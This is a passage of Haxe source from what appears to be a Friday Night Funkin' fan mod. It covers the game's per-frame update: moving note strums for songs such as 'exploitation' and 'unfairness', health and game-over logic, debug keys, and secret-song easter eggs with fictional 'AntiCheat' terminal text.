				FlxG.sound.music.volume = 0;

				FlxTween.tween(camHUD, {alpha: 0}, 1);
				
				for (note in unspawnNotes)
				{
					unspawnNotes.remove(note);
				}

				var black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
				black.scrollFactor.set();
				black.screenCenter();
				add(black);

				powerDown = new FlxSound().loadEmbedded(Paths.sound('fiveNights/powerOut', 'shared'));
				powerDown.play();
			}
			if (powerRanOut)
			{
				curStep < 1088 ? {
					new FlxTimer().start(FlxG.random.int(2, 4), function(timer:FlxTimer)
					{
						if (FlxG.random.int(0, 4) == 0)
						{
							health = 0;
						}
					}, Std.int(Math.POSITIVE_INFINITY));
				} : {
					powerRanOut = false;

					persistentUpdate = true;
					persistentDraw = true;
					
					camHUD.alpha = 1;
					vocals.volume = 1;
					FlxG.sound.music.volume = 0.8;
					sixAM();
				}
			}
			if (time != null)
			{
				var curTime = Std.int(Math.min(Math.floor(FlxG.sound.music.time / 1000 / (((Conductor.stepCrochet / 1000) * 1088) / times.length - 1)), times.length));
				time.text = times[curTime] + ' AM';
			}
			if (FlxG.mouse.overlaps(doorButton) && (FlxG.mouse.justPressed || controls.KEY5) && !doorChanging)
			{
				changeDoorState(!doorClosed);
			}
			if (dad.curCharacter == 'nofriend' && dad.animation.curAnim.name == 'attack' && dad.animation.curAnim.finished)
			{
				doorClosed ? {
					var slam = new FlxSound().loadEmbedded(Paths.sound('fiveNights/slam'));
					slam.play();
					dad.playAnim('fail');
					dad.animation.finishCallback = function(animation:String)
					{
						new FlxTimer().start(1.25, function(timer:FlxTimer)
						{
							dad.canDance = true;
							dad.canSing = true;
							dad.dance();
						});
					};
					powerLeft -= FlxG.random.int(2, 4);
				} : {
					health = 0;
				}
			}
		}
		if (baldi != null)
		{
			if (FlxG.mouse.overlaps(baldi) && FlxG.mouse.justPressed)
			{
				isStoryMode = false;
				storyPlaylist = [];
				FlxG.switchState(new MathGameState());
			}
		}
		
		var toy = -100 + -Math.sin((curStep / 9.5) * 2) * 30 * 5;
		var tox = -330 -Math.cos((curStep / 9.5)) * 100;

		//welcome to 3d sinning avenue
      if (stageCheck == 'exbungo-land') {
			place.y -= (Math.sin(elapsedtime) * 0.4);
		}
		if (dad.curCharacter == 'recurser')
		{
			toy = 100 + -Math.sin((elapsedtime) * 2) * 300;
			tox = -400 - Math.cos((elapsedtime)) * 200;

			dad.x += (tox - dad.x);
			dad.y += (toy - dad.y);
		}

		if(funnyFloatyBoys.contains(dad.curCharacter.toLowerCase()) && canFloat)
		{
			if (dad.curCharacter.toLowerCase() == "expunged")
			{
				// mentally insane movement
				dad.x += (tox - dad.x) / 12;
				dad.y += (toy - dad.y) / 12;
			}
			else
			{
				dad.y += (Math.sin(elapsedtime) * 0.2);
			}
		}
		if(funnyFloatyBoys.contains(boyfriend.curCharacter.toLowerCase()) && canFloat)
		{
			boyfriend.y += (Math.sin(elapsedtime) * 0.2);
		}
		/*if(funnyFloatyBoys.contains(dadmirror.curCharacter.toLowerCase()))
		{
			dadmirror.y += (Math.sin(elapsedtime) * 0.6);
		}*/

		if(funnyFloatyBoys.contains(gf.curCharacter.toLowerCase()) && canFloat)
		{
			gf.y += (Math.sin(elapsedtime) * 0.2);
		}
		if ((SONG.song.toLowerCase() == 'cheating' || localFunny == CharacterFunnyEffect.Dave) && !inCutscene) // fuck you
		{
			playerStrums.forEach(function(spr:StrumNote)                                               
			{
				spr.x += Math.sin(elapsedtime) * ((spr.ID % 2) == 0 ? 1 : -1);
				spr.x -= Math.sin(elapsedtime) * 1.5;
			});
			dadStrums.forEach(function(spr:StrumNote)
			{
				spr.x -= Math.sin(elapsedtime) * ((spr.ID % 2) == 0 ? 1 : -1);
				spr.x += Math.sin(elapsedtime) * 1.5;
			});
		}
		if (SONG.song.toLowerCase() == 'unfairness' && !inCutscene) // fuck you x2
		{
			playerStrums.forEach(function(spr:StrumNote)
			{
				spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin((elapsedtime + (spr.ID))) * 300);
				spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.cos((elapsedtime + (spr.ID))) * 300);
			});
			dadStrums.forEach(function(spr:StrumNote)
			{
				spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin((elapsedtime + (spr.ID)) * 2) * 300);
				spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.cos((elapsedtime + (spr.ID)) * 2) * 300);
			});
		}
		if (!inCutscene)
		{
			if (localFunny == CharacterFunnyEffect.Recurser)
			{
				playerStrums.forEach(function(spr:StrumNote)
				{
					spr.y = spr.baseY + ((Math.sin(elapsedtime + spr.ID)) * (spr.height * 0.75));
				});
				dadStrums.forEach(function(spr:StrumNote)
				{
					spr.y = spr.baseY + ((Math.sin(elapsedtime + (spr.ID + 4))) * (spr.height * 0.75));
				});
			}
		}

		if (SONG.song.toLowerCase() == 'exploitation' && !inCutscene && mcStarted) // fuck you
		{
			switch (modchart)
			{
				case ExploitationModchartType.None:

				case ExploitationModchartType.Jitterwave:
					playerStrums.forEach(function(spr:StrumNote)
					{
						if (spr.ID == 1)
						{
							spr.x = playerStrums.members[2].baseX;
						}
						else if (spr.ID == 2)
						{
							spr.x = playerStrums.members[1].baseX;
						}
						else
						{
							spr.x = spr.baseX;
						}
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + ((Math.sin((elapsedtime + spr.ID) * (((curBeat % 6) + 1) * 0.6))) * 140);
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						if (spr.ID == 1)
						{
							spr.x = dadStrums.members[2].baseX;
						}
						else if (spr.ID == 2)
						{
							spr.x = dadStrums.members[1].baseX;
						}
						else
						{
							spr.x = spr.baseX;
						}
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + ((Math.sin((elapsedtime + spr.ID) * (((curBeat % 6) + 1) * 0.6))) * 140);
					});
					
				case ExploitationModchartType.Cheating:
					playerStrums.forEach(function(spr:StrumNote)
					{
						spr.x += (spr.ID == 1 ? 0.5 : 1) * Math.sin(elapsedtime) * ((spr.ID % 3) == 0 ? 1 : -1);
						spr.x -= (spr.ID == 1 ? 0.5 : 1) * Math.sin(elapsedtime) * ((spr.ID / 3) + 1.2);
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						spr.x -= (spr.ID == 1 ? 0.5 : 1) * Math.sin(elapsedtime) * ((spr.ID % 3) == 0 ? 1 : -1);
						spr.x += (spr.ID == 1 ? 0.5 : 1) * Math.sin(elapsedtime) * ((spr.ID / 3) + 1.2);
					});

				case ExploitationModchartType.Sex: 
					playerStrums.forEach(function(spr:StrumNote)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2));
						spr.y = ((FlxG.height / 2) - (spr.height / 2));
						if (spr.ID == 0)
						{
							spr.x -= spr.width * 2.5;
						}
						if (spr.ID == 1)
						{
							spr.x += spr.width * 0.5;
							spr.y += spr.height;
						}
						if (spr.ID == 2)
						{
							spr.x -= spr.width * 0.5;
							spr.y += spr.height;
						}
						if (spr.ID == 3)
						{
							spr.x += spr.width * 2.5;
						}
						spr.x += Math.sin(elapsedtime * (spr.ID + 1)) * 30;
						spr.y += Math.cos(elapsedtime * (spr.ID + 1)) * 30;
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2));
						spr.y = ((FlxG.height / 2) - (spr.height / 2));
						spr.x += ((spr.width) * (spr.ID == 3 ? 0 : spr.ID == 0 ? 3 : spr.ID == 2 ? 1 : 2)) - (2 * spr.width) + (spr.width * 0.5);
						spr.x += Math.sin(elapsedtime * (spr.ID + 1)) * -30;
						spr.y += Math.cos(elapsedtime * (spr.ID + 1)) * -30;
					});
				case ExploitationModchartType.Unfairness: //unfairnesses mod chart with a few changes to keep it interesting
					playerStrums.forEach(function(spr:StrumNote)
					{
						//0.62 is a speed modifier. its there simply because i thought the og modchart was a bit too hard.
						spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin(((elapsedtime + (spr.ID * 2))) * 0.62) * 250);
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.cos(((elapsedtime + (spr.ID * 0.5))) * 0.62) * 250);
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin(((elapsedtime + (spr.ID * 0.5)) * 2) * 0.62) * 250);
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.cos(((elapsedtime + (spr.ID * 2)) * 2) * 0.62) * 250);
					});

				case ExploitationModchartType.PingPong:
					var xx = (FlxG.width / 2.4) + (Math.sin(elapsedtime * 1.2) * 400);
					var yy = (FlxG.height / 2) + (Math.sin(elapsedtime * 1.5) * 200) - 50;
					var xx2 = (FlxG.width / 2.4) + (Math.cos(elapsedtime) * 400);
					var yy2 = (FlxG.height / 2) + (Math.cos(elapsedtime * 1.4) * 200) - 50;
					playerStrums.forEach(function(spr:StrumNote)
					{
						spr.x = (xx + (spr.width / 2)) - (spr.ID == 0 || spr.ID == 2 ? spr.width : spr.ID == 1 || spr.ID == 3 ? -spr.width : 0);
						spr.y = (yy + (spr.height / 2)) - (spr.ID <= 1 ? 0 : spr.height);
						spr.x += Math.sin((elapsedtime + (spr.ID * 3)) / 3) * spr.width;
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						spr.x = (xx2 + (spr.width / 2)) - (spr.ID == 0 || spr.ID == 2 ? spr.width : spr.ID == 1 || spr.ID == 3 ? -spr.width : 0);
						spr.y = (yy2 + (spr.height / 2)) - (spr.ID <= 1 ? 0 : spr.height);
						spr.x += Math.sin((elapsedtime + (spr.ID * 3)) / 3) * spr.width;

					});

				case ExploitationModchartType.Figure8:
					playerStrums.forEach(function(spr:FlxSprite)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin((elapsedtime * 0.3) + spr.ID + 1) * (FlxG.width * 0.4));
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.sin(((elapsedtime * 0.3) + spr.ID) * 3) * (FlxG.height * 0.2));
					});
					dadStrums.forEach(function(spr:FlxSprite)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin((elapsedtime * 0.3) + spr.ID + 1.5) * (FlxG.width * 0.4));
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.sin((((elapsedtime * 0.3) + spr.ID) * -3) + 0.5) * (FlxG.height * 0.2));
					});
				case ExploitationModchartType.ScrambledNotes:
					playerStrums.forEach(function(spr:StrumNote)
					{
						spr.x = (FlxG.width / 2) + (Math.sin(elapsedtime) * ((spr.ID % 2) == 0 ? 1 : -1)) * (60 * (spr.ID + 1));
						spr.x += Math.sin(elapsedtime - 1) * 40;
						spr.y = (FlxG.height / 2) + (Math.sin(elapsedtime - 69.2) * ((spr.ID % 3) == 0 ? 1 : -1)) * (67 * (spr.ID + 1)) - 15;
						spr.y += Math.cos(elapsedtime - 1) * 40;
						spr.x -= 80;
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						spr.x = (FlxG.width / 2) + (Math.cos(elapsedtime - 1) * ((spr.ID % 2) == 0 ? -1 : 1)) * (60 * (spr.ID + 1));
						spr.x += Math.sin(elapsedtime - 1) * 40;
						spr.y = (FlxG.height / 2) + (Math.sin(elapsedtime - 63.4) * ((spr.ID % 3) == 0 ? -1 : 1)) * (67 * (spr.ID + 1)) - 15;
						spr.y += Math.cos(elapsedtime - 1) * 40;
						spr.x -= 80;
					});

				case ExploitationModchartType.Cyclone:
					playerStrums.forEach(function(spr:StrumNote)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.sin((spr.ID + 1) * (elapsedtime * 0.15)) * (65 * (spr.ID + 1)));
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.cos((spr.ID + 1) * (elapsedtime * 0.15)) * (65 * (spr.ID + 1)));
					});
					dadStrums.forEach(function(spr:StrumNote)
					{
						spr.x = ((FlxG.width / 2) - (spr.width / 2)) + (Math.cos((spr.ID + 1) * (elapsedtime * 0.15)) * (65 * (spr.ID + 1)));
						spr.y = ((FlxG.height / 2) - (spr.height / 2)) + (Math.sin((spr.ID + 1) * (elapsedtime * 0.15)) * (65 * (spr.ID + 1)));
					});
			}
		}
		// no more 3d sinning avenue
		if (daveFlying)
		{
			dad.y -= elapsed * 50;
			dad.angle -= elapsed * 6;
		}
		if (tweenList != null && tweenList.length != 0)
		{
			for (tween in tweenList)
			{
				if (tween.active && !tween.finished && !activateSunTweens)
					tween.percent = FlxG.sound.music.time / tweenTime;
			}
		}
        
		#if SHADERS_ENABLED
		FlxG.camera.setFilters([new ShaderFilter(screenshader.shader)]); // this is very stupid but doesn't effect memory all that much so
		#end
		if (shakeCam && eyesoreson)
		{
			// var shad = cast(FlxG.camera.screen.shader,Shaders.PulseShader);
			FlxG.camera.shake(0.010, 0.010);
		}

		#if SHADERS_ENABLED
		screenshader.shader.uTime.value[0] += elapsed;
		if (shakeCam && eyesoreson)
		{
			screenshader.shader.uampmul.value[0] = 1;
		}
		else
		{
			screenshader.shader.uampmul.value[0] -= (elapsed / 2);
		}
		screenshader.Enabled = shakeCam && eyesoreson;
		#end
		#if (SHADERS_ENABLED || mac)
		lazychartshader.shader.uTime.value[0] += elapsed;
		#end
		#if SHADERS_ENABLED
		if (blockedShader != null)
		{
			blockedShader.update(elapsed);
		}
		#end

		super.update(elapsed);

		switch (SONG.song.toLowerCase())
		{
			case 'overdrive':
				scoreTxt.text = "score: " + Std.string(songScore);
			case 'exploitation':
				scoreTxt.text = glitchText ? {
					"Scor3: " + (songScore * FlxG.random.int(1,9)) + 
				" | M1ss3s: " + (misses * FlxG.random.int(1,9)) + 
				" | Accuracy: " + (truncateFloat(accuracy, 2) * FlxG.random.int(1,9)) + "% ";
				} : {
					LanguageManager.getTextString('play_score') + Std.string(songScore) + " | " + 
					LanguageManager.getTextString('play_miss') + misses +  " | " + 
					LanguageManager.getTextString('play_accuracy') + truncateFloat(accuracy, 2) + "%";
				}
				scoreTxt.text = 
				"Scor3: " + (songScore * FlxG.random.int(1,9)) + 
				" | M1ss3s: " + (misses * FlxG.random.int(1,9)) + 
				" | Accuracy: " + (truncateFloat(accuracy, 2) * FlxG.random.int(1,9)) + "% ";
			default:
				scoreTxt.text = 
				LanguageManager.getTextString('play_score') + Std.string(songScore) + " | " + 
				LanguageManager.getTextString('play_miss') + misses +  " | " + 
				LanguageManager.getTextString('play_accuracy') + truncateFloat(accuracy, 2) + "%";
		}
		if (noMiss)
		{
			scoreTxt.text += " | NO MISS!!";
		}
		if (FlxG.keys.justPressed.ENTER && startedCountdown && canPause)
		{
			persistentUpdate = false;
			persistentDraw = true;
			paused = true;

			// 1 / 1000 chance for Gitaroo Man easter egg
			if (FlxG.random.bool(0.1))
			{
				// gitaroo man easter egg
				FlxG.switchState(new GitarooPause());
			}
			else
			{
				if (SONG.song.toLowerCase() == 'exploitation') //damn it
				{
					playerStrums.forEach(function(note:StrumNote)
					{
						FlxTween.completeTweensOf(note);
					});
					dadStrums.forEach(function(note:StrumNote)
					{
						FlxTween.completeTweensOf(note);
					});
				}
				openSubState(new PauseSubState(boyfriend.getScreenPosition().x, boyfriend.getScreenPosition().y));
			}
		}

		if (FlxG.keys.justPressed.SEVEN)
		{
			if(FlxTransitionableState.skipNextTransIn)
			{
				Transition.nextCamera = null;
			}
			
			switch (curSong.toLowerCase())
			{
				case 'supernovae':
					FlxG.switchState(new TerminalCheatingState([
						new TerminalText(0, [['Warning: ', 1], ['Chart Editor access detected', 1],]),
						new TerminalText(200, [['run AntiCheat.dll', 0.5]]),
						new TerminalText(0, [['ERROR: File currently being used by another process. Retrying in 3...', 3]]),
						new TerminalText(200, [['File no longer in use, running AntiCheat.dll..', 2]]),
					], function()
					{
						shakeCam = false;
						#if SHADERS_ENABLED
						screenshader.Enabled = false;
						#end

						isStoryMode = false;
						PlayState.SONG = Song.loadFromJson("cheating"); // you dun fucked up
						isStoryMode = false;
						PlayState.storyWeek = 14;
						FlxG.save.data.cheatingFound = true;
						FlxG.switchState(new PlayState());
					}));
					return;
				case 'cheating':
					FlxG.switchState(new TerminalCheatingState([
						new TerminalText(0, [['Warning: ', 1], ['Chart Editor access detected', 1],]),
						new TerminalText(200, [['run AntiCheat.dll', 3]]),
					], function()
					{
						isStoryMode = false;
						storyPlaylist = [];
						
						shakeCam = false;
						#if SHADERS_ENABLED
						screenshader.Enabled = false;
						#end

						PlayState.SONG = Song.loadFromJson("unfairness"); // you dun fucked up again
						PlayState.storyWeek = 15;
						FlxG.save.data.unfairnessFound = true;
						FlxG.switchState(new PlayState());
					}));
					return;
				case 'unfairness':
					FlxG.switchState(new TerminalCheatingState([
						new TerminalText(0, [
							['bin/plugins/AntiCheat.dll: ', 1],
							['No argument for function "AntiCheatThree"', 1],
						]),
						new TerminalText(100, [['Redirecting to terminal...', 1]])
					], function()
					{
						isStoryMode = false;
						storyPlaylist = [];
						
						shakeCam = false;
						#if SHADERS_ENABLED
						screenshader.Enabled = false;
						#end

						FlxG.switchState(new TerminalState());
					}));
					#if desktop
					DiscordClient.changePresence("I have your IP address", null, null, true);
					#end
					return;
				case 'exploitation' | 'master':
					health = 0;
				case 'recursed':
					ChartingState.hahaFunnyRecursed();
				case 'glitch':
					isStoryMode = false;
					storyPlaylist = [];
					
					PlayState.SONG = Song.loadFromJson("kabunga"); // lol you loser
					isStoryMode = false;
					FlxG.save.data.exbungoFound = true;
					shakeCam = false;
					#if SHADERS_ENABLED
					screenshader.Enabled = false;
					#end
					FlxG.switchState(new PlayState());
					return;
				case 'kabunga':
					fancyOpenURL("https://benjaminpants.github.io/muko_firefox/index.html"); //banger game
					System.exit(0);
				case 'vs-dave-rap':
					PlayState.SONG = Song.loadFromJson("vs-dave-rap-two");
					FlxG.save.data.vsDaveRapTwoFound = true;
					shakeCam = false;
					#if SHADERS_ENABLED
					screenshader.Enabled = false;
					#end
					FlxG.switchState(new PlayState());
					return;
				default:
					#if SHADERS_ENABLED
					resetShader();
					#end
					FlxG.switchState(new ChartingState());
					#if desktop
					DiscordClient.changePresence("Chart Editor", null, null, true);
					#end
			}
		}

		// FlxG.watch.addQuick('VOL', vocals.amplitudeLeft);
		// FlxG.watch.addQuick('VOLRight', vocals.amplitudeRight);

		var thingy = 0.88; //(144 / Main.fps.currentFPS) * 0.88;
		//still gotta make this fps consistent crap

		iconP1.setGraphicSize(Std.int(FlxMath.lerp(150, iconP1.width, thingy)),Std.int(FlxMath.lerp(150, iconP1.height, thingy)));
		iconP1.updateHitbox();

		iconP2.setGraphicSize(Std.int(FlxMath.lerp(150, iconP2.width, thingy)),Std.int(FlxMath.lerp(150, iconP2.height, thingy)));
		iconP2.updateHitbox();

		var iconOffset:Int = 26;

		if (inFiveNights)
		{
			iconP1.x = (healthBar.x + healthBar.width) - (healthBar.width * (FlxMath.remapToRange(healthBar.percent, 0, 100, 100, 0) * 0.01) + iconOffset);
			iconP2.x = (healthBar.x + healthBar.width) - (healthBar.width * (FlxMath.remapToRange(healthBar.percent, 0, 100, 100, 0) * 0.01)) - (iconP2.width - iconOffset);
		}
		else
		{
			iconP1.x = healthBar.x + (healthBar.width * (FlxMath.remapToRange(healthBar.percent, 0, 100, 100, 0) * 0.01) - iconOffset);
			iconP2.x = healthBar.x + (healthBar.width * (FlxMath.remapToRange(healthBar.percent, 0, 100, 100, 0) * 0.01)) - (iconP2.width - iconOffset);
		}

		if (health > 2)
			health = 2;

		if (SONG.song.toLowerCase() != "five-nights")
		{
			if (healthBar.percent < 20)
				iconP1.changeState('losing');
			else
				iconP1.changeState('normal');

			if (healthBar.percent > 80)
				iconP2.changeState('losing');
			else
				iconP2.changeState('normal');
		}
		else
		{
			if (healthBar.percent < 20)
				iconP2.changeState('losing');
			else
				iconP2.changeState('normal');

			if (healthBar.percent > 80)
				iconP1.changeState('losing');
			else
				iconP1.changeState('normal');
		}

		#if debug
		if (FlxG.keys.justPressed.FOUR)
		{
			trace('DUMP LOL:\nDAD POSITION: ${dad.getPosition()}\nBOYFRIEND POSITION: ${boyfriend.getPosition()}\nGF POSITION: ${gf.getPosition()}\nCAMERA POSITION: ${camFollow.getPosition()}');
		}
		if (FlxG.keys.justPressed.FIVE)
		{
			FlxG.switchState(new CharacterDebug(dad.curCharacter));
		}
		if (FlxG.keys.justPressed.SEMICOLON)
		{
			FlxG.switchState(new CharacterDebug(boyfriend.curCharacter));
		}
		if (FlxG.keys.justPressed.COMMA)
		{
			FlxG.switchState(new CharacterDebug(gf.curCharacter));
		}
		if (FlxG.keys.justPressed.EIGHT)
			FlxG.switchState(new AnimationDebug(dad.curCharacter));
		if (FlxG.keys.justPressed.SIX)
			FlxG.switchState(new AnimationDebug(boyfriend.curCharacter));
		if (FlxG.keys.justPressed.TWO) //Go 10 seconds into the future :O
		{
			FlxG.sound.music.pause();
			vocals.pause();
			boyfriend.stunned = true;
			Conductor.songPosition += 10000;
			notes.forEachAlive(function(daNote:Note)
			{
				if (daNote.strumTime + 800 < Conductor.songPosition) {
					daNote.active = false;
					daNote.visible = false;

					daNote.kill();
					notes.remove(daNote, true);
					daNote.destroy();
				}
			});
			for (i in 0...unspawnNotes.length)
			{
				var daNote:Note = unspawnNotes[0];
				if (daNote.strumTime + 800 >= Conductor.songPosition)
				{
					break;
				}

				daNote.active = false;
				daNote.visible = false;

				daNote.kill();
				unspawnNotes.splice(unspawnNotes.indexOf(daNote), 1);
				daNote.destroy();
			}

			FlxG.sound.music.time = Conductor.songPosition;
			FlxG.sound.music.play();

			vocals.time = Conductor.songPosition;
			vocals.play();
			boyfriend.stunned = false;
		}
		if (FlxG.keys.justPressed.THREE)
			FlxG.switchState(new AnimationDebug(gf.curCharacter));
		#end
	
		if (startingSong)
		{
			if (startedCountdown)
			{
				Conductor.songPosition += FlxG.elapsed * 1000;
				if (Conductor.songPosition >= 0)
				{
					startSong();
				}
			}
		}
		else
		{
			// Conductor.songPosition = FlxG.sound.music.time;
			Conductor.songPosition += FlxG.elapsed * 1000 * timeSpeed;

			if (!paused)
			{
				songTime += FlxG.game.ticks - previousFrameTime;
				previousFrameTime = FlxG.game.ticks;

				// Interpolation type beat
				if (Conductor.lastSongPos != Conductor.songPosition)
				{
					songTime = (songTime + Conductor.songPosition) / 2;
					Conductor.lastSongPos = Conductor.songPosition;
					// Conductor.songPosition += FlxG.elapsed * 1000;
					// trace('MISSED FRAME');
				}
			}

			// Conductor.lastSongPos = FlxG.sound.music.time;
		}

		if (camZooming || crazyZooming)
		{
			FlxG.camera.zoom = FlxMath.lerp(defaultCamZoom, FlxG.camera.zoom, 0.95);
			camHUD.zoom = FlxMath.lerp(1, camHUD.zoom, 0.95);
		}

		FlxG.watch.addQuick("beatShit", curBeat);
		FlxG.watch.addQuick("stepShit", curStep);

		if (health <= 0)
		{
			if(!perfectMode)
			{
				boyfriend.stunned = true;

				persistentUpdate = false;
				persistentDraw = false;
				paused = true;
	
				vocals.stop();
				FlxG.sound.music.stop();
				
				#if SHADERS_ENABLED
				screenshader.shader.uampmul.value[0] = 0;
				screenshader.Enabled = false;
				#end
			}

			if (!shakeCam)
			{
				if(!perfectMode)
				{
					gameOver();
				}
			}
			else
			{
				CharacterSelectState.unlockCharacter('bambi-3d');
				if (isStoryMode)
				{
					switch (SONG.song.toLowerCase())
					{
						case 'blocked' | 'corn-theft' | 'maze':
							FlxG.openURL("https://www.youtube.com/watch?v=eTJOdgDzD64");
							System.exit(0);
						default:
							if (shakeCam)
							{
								CharacterSelectState.unlockCharacter('bambi-3d');
							}
							FlxG.switchState(new EndingState('rtxx_ending', 'badEnding'));
					}
				}
				else
				{
					if (!perfectMode)
					{
						if(shakeCam)
						{
							CharacterSelectState.unlockCharacter('bambi-3d');
						}
						gameOver();
					}
				}
			}

			// FlxG.switchState(new GameOverState(boyfriend.getScreenPosition().x, boyfriend.getScreenPosition().y));
		}

		if (unspawnNotes[0] != null)
		{
			var thing:Int = (SONG.song.toLowerCase() == 'unfairness' || PlayState.SONG.song.toLowerCase() == 'exploitation' ? 15000 : 1500);

			if (unspawnNotes[0].strumTime - Conductor.songPosition < thing)
			{
				var dunceNote:Note = unspawnNotes[0];
				dunceNote.finishedGenerating = true;

				notes.add(dunceNote);

				var index:Int = unspawnNotes.indexOf(dunceNote);
				unspawnNotes.splice(index, 1);
			}
		}
		var currentSection = SONG.notes[Math.floor(curStep / 16)];

		if (generatedMusic)
		{
			notes.forEachAlive(function(daNote:Note)
			{
				if (daNote.y > FlxG.height)
				{
					daNote.active = false;
					daNote.visible = false;
				}
				else
				{
					daNote.visible = true;
					daNote.active = true;
				}
				if (daNote.mustPress && (Conductor.songPosition >= daNote.strumTime) && daNote.health != 2 && daNote.noteStyle == 'phone')
				{
					daNote.health = 2;
					dad.playAnim(dad.animation.getByName("singThrow") == null ? 'singSmash' : 'singThrow', true);
				}
				if (!daNote.mustPress && daNote.wasGoodHit)
				{
					if (SONG.song != 'Warmup')
						camZooming = true; 

					var altAnim:String = "";
					var healthtolower:Float = 0.02;

					if (currentSection != null)
					{
						if (daNote.noteStyle == 'phone-alt')
						{
							altAnim = '-alt';
						}
						if (currentSection.altAnim)
							if (SONG.song.toLowerCase() != "cheating")
							{
								altAnim = '-alt';
							}
							else
							{
								healthtolower = 0.005;
							}
					}
					if (inFiveNights && !daNote.isSustainNote)
					{
						dadCombo++;
						createScorePopUp(0, 0, true, FlxG.random.int(0,10) == 0 ? "good" : "sick", dadCombo, "3D");
					}

					var noteTypes = guitarSection ? notestuffsGuitar : notestuffs;
					var noteToPlay:String = noteTypes[Math.round(Math.abs(daNote.originalType)) % dadStrumAmount];
					switch (daNote.noteStyle)
					{
						case 'phone':
							dad.playAnim('singSmash', true);
						default:
							if (dad.nativelyPlayable)
							{
								switch (noteToPlay)
								{
									case 'LEFT':
										noteToPlay = 'RIGHT';
									case 'RIGHT':
										noteToPlay = 'LEFT';
								}
							}
							dad.playAnim('sing' + noteToPlay + altAnim, true);
							if (dadmirror != null)
							{
								dadmirror.playAnim('sing' + noteToPlay + altAnim, true);
							}
					}
					cameraMoveOnNote(daNote.originalType, 'dad');
					
					dadStrums.forEach(function(sprite:StrumNote)
					{
						if (Math.abs(Math.round(Math.abs(daNote.noteData)) % dadStrumAmount) == sprite.ID)
						{
							sprite.animation.play('confirm', true);
							if (sprite.animation.curAnim.name == 'confirm')
							{
								sprite.centerOffsets();
								sprite.offset.x -= 13;
								sprite.offset.y -= 13;
							}
							else
							{
								sprite.centerOffsets();
							}
							sprite.animation.finishCallback = function(name:String)
							{
								sprite.animation.play('static', true);
								sprite.centerOffsets();
							}
						}
					});
					if (UsingNewCam)
					{
						focusOnDadGlobal = true;
						ZoomCam(true);
					}

					switch (SONG.song.toLowerCase())
					{
						case 'cheating':
							health -= healthtolower;
						case 'unfairness':
							health -= (healthtolower / 3);
						case 'exploitation':
							if (((health + (FlxEase.backInOut(health / 16.5)) - 0.002) >= 0) && !(curBeat >= 320 && curBeat <= 330))
							{
								health += ((FlxEase.backInOut(health / 16.5)) * (curBeat <= 160 ? 0.25 : 1)) - 0.002; //some training wheels cuz rapparep say mod too hard
							}
						case 'mealie':
							if (curBeat >= 464 && curBeat <= 592) {
								health -= (healthtolower / 1.5);
							}
						case 'five-nights':
							if ((health - 0.023) > 0)
							{
								health -= 0.023;
							}
							else
							{
								health = 0.001;
							}
					}
					// boyfriend.playAnim('hit',true);
					dad.holdTimer = 0;

					if (SONG.needsVoices)
						vocals.volume = 1;

					daNote.kill();
					notes.remove(daNote, true);
					daNote.destroy();
				}
				if (daNote.MyStrum != null)
				{
					daNote.y = yFromNoteStrumTime(daNote, daNote.MyStrum, scrollType == 'downscroll');
				}
				else
				{
					daNote.y = yFromNoteStrumTime(daNote, strumLine, scrollType == 'downscroll');
				}
				// WIP interpolation shit? Need to fix the pause issue
				// daNote.y = (strumLine.y - (songTime - daNote.strumTime) * (0.45 * PlayState.SONG.speed));
				var noteSpeed = (daNote.LocalScrollSpeed == 0 ? 1 : daNote.LocalScrollSpeed);
				
				if (daNote.wasGoodHit && daNote.isSustainNote && Conductor.songPosition >= (daNote.strumTime + 10))
				{
					destroyNote(daNote);
				}
				if (!daNote.wasGoodHit && daNote.mustPress && daNote.finishedGenerating && Conductor.songPosition >= daNote.strumTime + (350 / (0.45 * FlxMath.roundDecimal(SONG.speed * noteSpeed, 2))))
				{
					if (!noMiss)
						noteMiss(daNote.originalType, daNote);

					vocals.volume = 0;

					destroyNote(daNote);
				}
			});
		}

		ZoomCam(focusOnDadGlobal);

		if (!inCutscene)
			keyShit();

		#if debug
		if (FlxG.keys.justPressed.ONE)
			endSong();
		#end

		if (updatevels)
		{
			stupidx *= 0.98;
			stupidy += elapsed * 6;
			if (BAMBICUTSCENEICONHURHURHUR != null)
			{
				BAMBICUTSCENEICONHURHURHUR.x += stupidx;
				BAMBICUTSCENEICONHURHURHUR.y += stupidy;
			}
		}

		if (expungedWindowMode && window != null)
		{
			var display = Application.current.window.display.currentMode;

			@:privateAccess
			var dadFrame = dad._frame;
			if (dadFrame == null || dadFrame.frame == null) return; // prevent crashes (i hope)
	  
			var rect = new Rectangle(dadFrame.frame.x, dadFrame.frame.y, dadFrame.frame.width, dadFrame.frame.height);

			expungedScroll.scrollRect = rect;

			window.x = Std.int(expungedOffset.x);
			window.y = Std.int(expungedOffset.y);

			if (!expungedMoving)
			{
				elapsedexpungedtime += elapsed * 9;

				var screenwidth = Application.current.window.display.bounds.width;
				var screenheight = Application.current.window.display.bounds.height;

				var toy = ((-Math.sin((elapsedexpungedtime / 9.5) * 2) * 30 * 5.1) / 1080) * screenheight;
